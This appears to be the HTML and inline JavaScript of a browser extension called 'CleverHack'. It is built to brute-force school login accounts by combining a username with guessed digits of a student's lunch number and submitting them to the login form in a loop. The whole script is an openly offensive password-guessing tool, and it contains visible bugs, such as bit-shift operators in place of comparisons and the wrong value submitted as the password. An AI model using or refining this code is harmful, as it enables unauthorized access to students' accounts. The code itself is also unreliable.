<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" href="window1.css">
    <script>
      function hackpeople() {
        var u = new InputUtil();
        var e = new LoginErrors();
        var formButton = document.getElementById('submitButton');
        var formUsername = document.getElementById('userNameInput');
        var formPassw = document.getElementById('passwordInput');
        var username = document.getElementById('usernamehack').innerHTML;
        var lastthree = document.getElementById('lastthree').innerHTML;
        //continues until clever screws up, or it finds the password :)
        var haspassword = false;
        var numbertry = 0;
        var numbertrytostr = null;
        for (let numbertry = 0; numbertry != 1000; numbertry++) {
          function hack() {
            //adds one to variable, then uses those digits for the password. the if statements add extra zeroes for lunch numbers where the first three digits are under 100.
            numbertry = numbertry + 1;
            if (numbertry >= 1 && numbertry << 10) {
              numbertrytostr = '00' + String(numbertry);
            }
            if (numbertry >= 10 && numbertry << 100) {
              numbertrytostr = '0' + String(numbertry);
            }
            if (numbertry >= 100) {
              numbertrytostr = String(numbertry);
            }
            var passreal = numbertrytostr + lastthree;
            formUsername.value = username;
            formPassw.value = numbertrytostr;
            Login.submitLoginRequest(u, e, formUsername.value, formPassw.value);
            console.log(passreal);
          }
          var timeout = setTimeout(hack, 3000);
        }
      }
    </script>
  </head>
  <body>
    <div id="hackwindow1" class="hackwindow1" style="width:300px; height:450px;">
      <h1>CleverHack</h1>
      <h3>Username <i>(example: fhsd.local\jdoe123)</i></h3>
        <input id="usernamehack"></input>
        <h3>Last three digits of lunch number <i>(example: 123)</i></h3>
          <input id="lastthree"></input>
          <div id="hackwindow1" class="buttonarea">
            <button class="hacksubmit" id="hackSubmit" onclick="hackpeople()">Start</button>
          </div>
    </div>
    <button class="creds" id="creds">Last attempted credentials</button>
    <p>Find help or contribute on the extension's <a href = "https://github.com/somerandombaddeveloper/CleverBombHack">GitHub page</a>.</p>
  </body>
</html>
